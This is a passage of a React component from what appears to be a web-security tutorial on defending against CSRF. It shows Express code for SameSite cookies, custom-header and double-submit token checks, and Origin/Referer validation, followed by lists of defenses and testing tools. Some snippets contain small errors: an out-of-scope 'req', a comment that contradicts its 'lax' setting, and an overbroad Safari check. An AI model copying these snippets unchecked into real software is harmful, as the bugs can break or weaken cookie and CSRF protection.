                          This browser-enforced protection can significantly reduce CSRF attack surface when properly configured.
                        </p>
                        
                        <h7 className="font-medium text-sm mb-2">SameSite Values and Their Impact:</h7>
                        <ul className="list-disc pl-6 space-y-1 text-xs mb-3">
                          <li><strong>Strict:</strong> Cookies never sent with cross-site requests, maximum protection but may break legitimate workflows</li>
                          <li><strong>Lax:</strong> Cookies sent with top-level navigation but not with embedded requests, good balance of security and usability</li>
                          <li><strong>None:</strong> Cookies sent with all cross-site requests, requires Secure flag and HTTPS</li>
                        </ul>
                      </div>
                      
                      <CodeExample
                        language="javascript"
                        title="SameSite Cookie Configuration"
                        code={`// Express.js session configuration with SameSite
const session = require('express-session');
const MongoStore = require('connect-mongo');

app.use(session({
  secret: process.env.SESSION_SECRET,
  name: 'sessionId', // Don't use default session name
  cookie: {
    httpOnly: true, // Prevent XSS access to cookies
    secure: process.env.NODE_ENV === 'production', // HTTPS only in production
    sameSite: 'strict', // Strongest CSRF protection
    maxAge: 24 * 60 * 60 * 1000, // 24 hours
    domain: '.example.com' // Explicit domain setting
  },
  resave: false,
  saveUninitialized: false,
  store: MongoStore.create({
    mongoUrl: process.env.MONGODB_URL
  })
}));

// Alternative configuration for applications requiring cross-site functionality
app.use(session({
  secret: process.env.SESSION_SECRET,
  cookie: {
    httpOnly: true,
    secure: true, // Required when sameSite: 'none'
    sameSite: 'lax', // More permissive for legitimate cross-site navigation
    maxAge: 4 * 60 * 60 * 1000 // 4 hours for sensitive applications
  },
  resave: false,
  saveUninitialized: false
}));

// Manual cookie setting with SameSite
app.post('/login', (req, res) => {
  // Authenticate user...
  
  const token = generateSecureToken();
  
  // Set authentication cookie with proper security attributes
  res.cookie('auth-token', token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 8 * 60 * 60 * 1000, // 8 hours
    path: '/', // Explicit path
    domain: process.env.COOKIE_DOMAIN
  });
  
  res.json({ success: true, message: 'Login successful' });
});

// Browser detection for SameSite support
function setSameSiteCookie(res, name, value, options) {
  const userAgent = req.get('User-Agent') || '';
  
  // Check for browsers that don't support SameSite
  const isUnsupportedBrowser = /Chrome\/5[1-9]|Chrome\/6[0-6]/.test(userAgent) ||
                               /Safari\//.test(userAgent) && !/Chrome/.test(userAgent);
  
  if (isUnsupportedBrowser) {
    // Fallback for older browsers - use secure and httpOnly flags only
    res.cookie(name, value, {
      ...options,
      sameSite: undefined
    });
  } else {
    res.cookie(name, value, options);
  }
}`}
                      />
                    </div>
                  </TabsContent>
                  
                  <TabsContent value="headers" className="mt-4">
                    <div className="space-y-4">
                      <div className="p-4 bg-cybr-muted/50 rounded-md">
                        <h6 className="font-medium mb-2">Custom Headers for CSRF Protection</h6>
                        <p className="text-sm mb-3">
                          Custom headers provide an additional layer of CSRF protection by leveraging the Same-Origin Policy. 
                          Browsers prevent cross-site requests from setting custom headers, making this an effective defense 
                          for AJAX-heavy applications and APIs.
                        </p>
                        
                        <h7 className="font-medium text-sm mb-2">Implementation Strategy:</h7>
                        <ul className="list-disc pl-6 space-y-1 text-xs mb-3">
                          <li>Require custom headers for all API endpoints</li>
                          <li>Use double-submit cookie pattern with header validation</li>
                          <li>Implement both client-side and server-side header validation</li>
                          <li>Combine with other CSRF protection methods for defense-in-depth</li>
                        </ul>
                      </div>
                      
                      <CodeExample
                        language="javascript"
                        title="Custom Headers for CSRF Protection"
                        code={`// Client-side: Add custom header to all AJAX requests
class CSRFProtectedAPI {
  constructor() {
    this.csrfToken = this.getCSRFToken();
    this.apiBaseUrl = '/api';
  }
  
  getCSRFToken() {
    // Get token from meta tag
    const metaToken = document.querySelector('meta[name="csrf-token"]');
    return metaToken ? metaToken.getAttribute('content') : null;
  }
  
  async makeSecureRequest(endpoint, options = {}) {
    const defaultHeaders = {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest', // Custom header requirement
      'X-CSRF-Token': this.csrfToken
    };
    
    const requestOptions = {
      ...options,
      headers: {
        ...defaultHeaders,
        ...options.headers
      },
      credentials: 'include' // Include cookies
    };
    
    try {
      const response = await fetch(\`\${this.apiBaseUrl}\${endpoint}\`, requestOptions);
      
      if (!response.ok) {
        if (response.status === 403) {
          throw new Error('CSRF protection triggered');
        }
        throw new Error(\`HTTP \${response.status}: \${response.statusText}\`);
      }
      
      return await response.json();
    } catch (error) {
      console.error('API request failed:', error);
      throw error;
    }
  }
  
  // Wrapper methods for different HTTP verbs
  async get(endpoint) {
    return this.makeSecureRequest(endpoint, { method: 'GET' });
  }
  
  async post(endpoint, data) {
    return this.makeSecureRequest(endpoint, {
      method: 'POST',
      body: JSON.stringify(data)
    });
  }
  
  async put(endpoint, data) {
    return this.makeSecureRequest(endpoint, {
      method: 'PUT',
      body: JSON.stringify(data)
    });
  }
  
  async delete(endpoint) {
    return this.makeSecureRequest(endpoint, { method: 'DELETE' });
  }
}

// Server-side: Validate custom headers
const express = require('express');
const app = express();

// Middleware to validate required headers
function requireCustomHeaders(req, res, next) {
  const requiredHeaders = {
    'x-requested-with': 'XMLHttpRequest',
    'x-csrf-token': req.session.csrfToken || req.cookies.csrfToken
  };
  
  // Check for required custom header
  if (!req.headers['x-requested-with']) {
    return res.status(400).json({ 
      error: 'Missing required header: X-Requested-With',
      code: 'MISSING_CUSTOM_HEADER'
    });
  }
  
  // Validate X-Requested-With header value
  if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
    return res.status(400).json({ 
      error: 'Invalid X-Requested-With header value',
      code: 'INVALID_HEADER_VALUE'
    });
  }
  
  // CSRF token validation via header
  const csrfToken = req.headers['x-csrf-token'];
  const storedToken = req.session.csrfToken;
  
  if (!csrfToken || !storedToken) {
    return res.status(403).json({ 
      error: 'CSRF token missing from headers',
      code: 'CSRF_TOKEN_MISSING'
    });
  }
  
  if (csrfToken !== storedToken) {
    return res.status(403).json({ 
      error: 'Invalid CSRF token in headers',
      code: 'CSRF_TOKEN_INVALID'
    });
  }
  
  next();
}

// Apply header validation to API routes
app.use('/api/', requireCustomHeaders);

// Double submit cookie pattern implementation
app.use('/api/', (req, res, next) => {
  const cookieToken = req.cookies['csrf-token'];
  const headerToken = req.headers['x-csrf-token'];
  
  if (!cookieToken || !headerToken) {
    return res.status(403).json({ 
      error: 'CSRF tokens missing',
      code: 'CSRF_DOUBLE_SUBMIT_MISSING'
    });
  }
  
  if (cookieToken !== headerToken) {
    return res.status(403).json({ 
      error: 'CSRF token mismatch',
      code: 'CSRF_DOUBLE_SUBMIT_MISMATCH'
    });
  }
  
  next();
});

// Content-Type validation for JSON endpoints
app.use('/api/json/', (req, res, next) => {
  const contentType = req.headers['content-type'];
  
  if (!contentType || !contentType.includes('application/json')) {
    return res.status(400).json({ 
      error: 'Invalid content type, expected application/json',
      code: 'INVALID_CONTENT_TYPE'
    });
  }
  
  next();
});`}
                      />
                    </div>
                  </TabsContent>
                  
                  <TabsContent value="validation" className="mt-4">
                    <div className="space-y-4">
                      <div className="p-4 bg-cybr-muted/50 rounded-md">
                        <h6 className="font-medium mb-2">Origin and Referer Validation</h6>
                        <p className="text-sm mb-3">
                          Origin and Referer header validation provides an additional defensive layer by ensuring requests 
                          originate from expected domains. While not foolproof due to potential header spoofing or missing headers, 
                          this validation can effectively block many CSRF attacks when implemented correctly.
                        </p>
                        
                        <h7 className="font-medium text-sm mb-2">Implementation Considerations:</h7>
                        <ul className="list-disc pl-6 space-y-1 text-xs mb-3">
                          <li>Origin header is more reliable than Referer and is sent with POST requests</li>
                          <li>Handle cases where headers might be missing (proxies, privacy tools)</li>
                          <li>Implement subdomain validation carefully to prevent subdomain takeover attacks</li>
                          <li>Use as a secondary defense, not the primary CSRF protection</li>
                        </ul>
                      </div>
                      
                      <CodeExample
                        language="javascript"
                        title="Origin and Referer Validation"
                        code={`// Comprehensive Origin and Referer validation
const crypto = require('crypto');
const url = require('url');

class CSRFOriginValidator {
  constructor(allowedOrigins, allowedDomains) {
    this.allowedOrigins = new Set(allowedOrigins);
    this.allowedDomains = new Set(allowedDomains);
  }
  
  validateOrigin(req, res, next) {
    const origin = req.headers.origin;
    const host = req.headers.host;
    
    // For same-origin requests, origin might be undefined
    if (!origin) {
      // Check if it's a same-origin request
      const referer = req.headers.referer;
      if (referer) {
        const refererUrl = new URL(referer);
        if (refererUrl.host === host) {
          return next(); // Same-origin request
        }
      }
      
      // Strict mode: reject requests without origin
      if (process.env.CSRF_STRICT_ORIGIN === 'true') {
        return res.status(403).json({ 
          error: 'Origin header required',
          code: 'ORIGIN_MISSING'
        });
      }
      
      return next(); // Allow requests without origin in non-strict mode
    }
    
    // Validate against allowed origins
    if (this.allowedOrigins.has(origin)) {
      return next();
    }
    
    // Validate against allowed domains (including subdomains)
    try {
      const originUrl = new URL(origin);
      const originDomain = originUrl.hostname;
      
      for (const allowedDomain of this.allowedDomains) {
        if (originDomain === allowedDomain || 
            originDomain.endsWith(\`.\${allowedDomain}\`)) {
          return next();
        }
      }
    } catch (error) {
      return res.status(400).json({ 
        error: 'Invalid origin format',
        code: 'ORIGIN_INVALID_FORMAT'
      });
    }
    
    // Origin not allowed
    return res.status(403).json({ 
      error: \`Origin '\${origin}' not allowed\`,
      code: 'ORIGIN_NOT_ALLOWED'
    });
  }
  
  validateReferer(req, res, next) {
    const referer = req.headers.referer;
    const host = req.headers.host;
    
    if (!referer) {
      // Some legitimate requests might not have referer
      if (process.env.CSRF_REQUIRE_REFERER === 'true') {
        return res.status(403).json({ 
          error: 'Referer header required',
          code: 'REFERER_MISSING'
        });
      }
      return next();
    }
    
    try {
      const refererUrl = new URL(referer);
      const refererHost = refererUrl.hostname;
      
      // Check if referer matches current host
      if (refererHost === host) {
        return next();
      }
      
      // Check against allowed domains
      for (const allowedDomain of this.allowedDomains) {
        if (refererHost === allowedDomain || 
            refererHost.endsWith(\`.\${allowedDomain}\`)) {
          return next();
        }
      }
      
      return res.status(403).json({ 
        error: \`Referer '\${refererHost}' not allowed\`,
        code: 'REFERER_NOT_ALLOWED'
      });
      
    } catch (error) {
      return res.status(400).json({ 
        error: 'Invalid referer format',
        code: 'REFERER_INVALID_FORMAT'
      });
    }
  }
}

// Usage example
const csrfValidator = new CSRFOriginValidator(
  ['https://app.example.com', 'https://admin.example.com'], // Exact origins
  ['example.com'] // Domains (includes subdomains)
);

// Apply validation middleware
app.use('/api/sensitive/', [
  csrfValidator.validateOrigin.bind(csrfValidator),
  csrfValidator.validateReferer.bind(csrfValidator)
]);

// Advanced validation with logging
function enhancedOriginValidation(req, res, next) {
  const origin = req.headers.origin;
  const referer = req.headers.referer;
  const userAgent = req.headers['user-agent'];
  const xForwardedFor = req.headers['x-forwarded-for'];
  const realIP = req.headers['x-real-ip'];
  
  // Log suspicious requests for monitoring
  const logData = {
    timestamp: new Date().toISOString(),
    ip: realIP || xForwardedFor || req.connection.remoteAddress,
    origin,
    referer,
    userAgent,
    endpoint: req.path,
    method: req.method
  };
  
  // Check for common CSRF attack patterns
  const suspiciousPatterns = [
    /data:text\/html/i, // Data URLs
    /javascript:/i,     // JavaScript URLs
    /file:/i,          // File URLs
    /chrome-extension:/i // Browser extensions
  ];
  
  if (origin && suspiciousPatterns.some(pattern => pattern.test(origin))) {
    console.warn('Suspicious origin detected:', logData);
    return res.status(403).json({ 
      error: 'Suspicious origin blocked',
      code: 'SUSPICIOUS_ORIGIN'
    });
  }
  
  // Rate limiting based on origin
  if (origin && isRateLimited(origin)) {
    return res.status(429).json({ 
      error: 'Rate limit exceeded for origin',
      code: 'ORIGIN_RATE_LIMITED'
    });
  }
  
  next();
}

// Rate limiting helper (simplified)
const originRequests = new Map();

function isRateLimited(origin) {
  const now = Date.now();
  const windowMs = 60000; // 1 minute
  const maxRequests = 100;
  
  if (!originRequests.has(origin)) {
    originRequests.set(origin, []);
  }
  
  const requests = originRequests.get(origin);
  const recentRequests = requests.filter(timestamp => now - timestamp < windowMs);
  
  if (recentRequests.length >= maxRequests) {
    return true;
  }
  
  recentRequests.push(now);
  originRequests.set(origin, recentRequests);
  return false;
}`}
                      />
                    </div>
                  </TabsContent>
                </Tabs>
              </div>
            </div>
            
            {/* Secondary Defenses */}
            <div>
              <h5 className="text-lg font-semibold mb-3">Secondary Defense Mechanisms</h5>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">User Interaction Requirements</h6>
                  <p className="text-sm mb-3">
                    Requiring explicit user interaction for sensitive operations can prevent automated CSRF attacks. 
                    This includes CAPTCHA challenges, password re-authentication, or explicit confirmation steps.
                  </p>
                  <ul className="list-disc pl-6 space-y-1 text-xs">
                    <li>CAPTCHA for high-value operations</li>
                    <li>Password re-authentication for sensitive changes</li>
                    <li>Email or SMS confirmation for critical actions</li>
                    <li>Multi-step confirmation processes</li>
                  </ul>
                </div>
                
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Request Analysis and Monitoring</h6>
                  <p className="text-sm mb-3">
                    Implementing behavioral analysis and monitoring can help detect and prevent CSRF attacks 
                    by identifying unusual request patterns or suspicious activity.
                  </p>
                  <ul className="list-disc pl-6 space-y-1 text-xs">
                    <li>Rate limiting on sensitive endpoints</li>
                    <li>Geolocation-based request validation</li>
                    <li>Device fingerprinting for anomaly detection</li>
                    <li>Real-time monitoring and alerting</li>
                  </ul>
                </div>
              </div>
            </div>
            
            {/* Framework-Specific Implementations */}
            <div>
              <h5 className="text-lg font-semibold mb-3">Framework-Specific CSRF Protection</h5>
              
              <div className="p-4 bg-cybr-muted/50 rounded-md">
                <h6 className="font-medium mb-2">Popular Framework Implementations</h6>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <h7 className="font-medium text-sm mb-1">Backend Frameworks:</h7>
                    <ul className="list-disc pl-6 space-y-1 text-xs">
                      <li><strong>Django:</strong> Built-in CSRF middleware with {% csrf_token %} template tag</li>
                      <li><strong>Ruby on Rails:</strong> protect_from_forgery method with authenticity tokens</li>
                      <li><strong>ASP.NET Core:</strong> Anti-forgery tokens with [ValidateAntiForgeryToken]</li>
                      <li><strong>Spring Security:</strong> CSRF protection enabled by default in newer versions</li>
                      <li><strong>Laravel:</strong> @csrf Blade directive and automatic validation</li>
                    </ul>
                  </div>
                  <div>
                    <h7 className="font-medium text-sm mb-1">Frontend Frameworks:</h7>
                    <ul className="list-disc pl-6 space-y-1 text-xs">
                      <li><strong>Angular:</strong> Built-in CSRF protection with HttpClientXsrfModule</li>
                      <li><strong>React:</strong> Manual implementation with libraries like axios interceptors</li>
                      <li><strong>Vue.js:</strong> CSRF token integration with axios or custom implementations</li>
                      <li><strong>jQuery:</strong> Global AJAX setup with CSRF token headers</li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Testing Tools */}
        <div>
          <h4 className="text-xl font-semibold mb-4">CSRF Testing Tools and Resources</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Automated Scanning Tools</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Burp Suite Professional:</strong> Advanced CSRF detection with PoC generation</li>
                <li><strong>OWASP ZAP:</strong> Active and passive CSRF vulnerability scanning</li>
                <li><strong>CSRFtester:</strong> Specialized tool for comprehensive CSRF testing</li>
                <li><strong>Nuclei:</strong> Template-based CSRF detection and exploitation</li>
                <li><strong>W3af:</strong> Web application scanner with CSRF detection capabilities</li>
                <li><strong>Acunetix:</strong> Commercial scanner with CSRF vulnerability detection</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Manual Testing and Development Tools</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Browser DevTools:</strong> Network monitoring and request analysis</li>
                <li><strong>Postman/Insomnia:</strong> API testing and request crafting</li>
                <li><strong>curl:</strong> Command-line HTTP request testing</li>
                <li><strong>CSRF PoC Generator:</strong> Automated HTML form generation tools</li>
                <li><strong>HackBar:</strong> Browser extension for security testing</li>
                <li><strong>Custom Scripts:</strong> Python, JavaScript automation for testing</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Environment-Specific Considerations */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Environment and Technology Considerations</h4>
          <div className="space-y-4">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Technology Stack Considerations</h5>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <h6 className="font-medium text-sm mb-2">Single Page Applications (SPAs):</h6>
                  <ul className="list-disc pl-6 space-y-1 text-xs">
                    <li>Rely heavily on AJAX requests, requiring token-based protection</li>
                    <li>Need token refresh mechanisms for long-running sessions</li>
                    <li>Should implement proper logout and session invalidation</li>
                    <li>Consider using JWT with proper CSRF protection</li>
                  </ul>
                </div>
                <div>
                  <h6 className="font-medium text-sm mb-2">API-First Applications:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-xs">
                    <li>Should not rely solely on cookies for authentication</li>
                    <li>Implement proper CORS policies</li>
                    <li>Use stateless authentication when possible</li>
                    <li>Validate Content-Type headers strictly</li>
                  </ul>
                </div>
              </div>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Deployment Environment Impact</h5>
              <ul className="list-disc pl-6 space-y-2 text-sm">
                <li><strong>Load Balancers:</strong> Ensure session affinity or shared session storage for token validation</li>
                <li><strong>CDN Integration:</strong> Configure proper cache headers and origin validation</li>
                <li><strong>Microservices:</strong> Implement consistent CSRF protection across all services</li>
                <li><strong>Container Environments:</strong> Manage secrets and tokens securely across containers</li>
                <li><strong>Cloud Platforms:</strong> Leverage platform-specific security features and WAF rules</li>
                <li><strong>Mobile Applications:</strong> Consider token-based authentication over cookie-based for mobile APIs</li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};

export default CSRF;
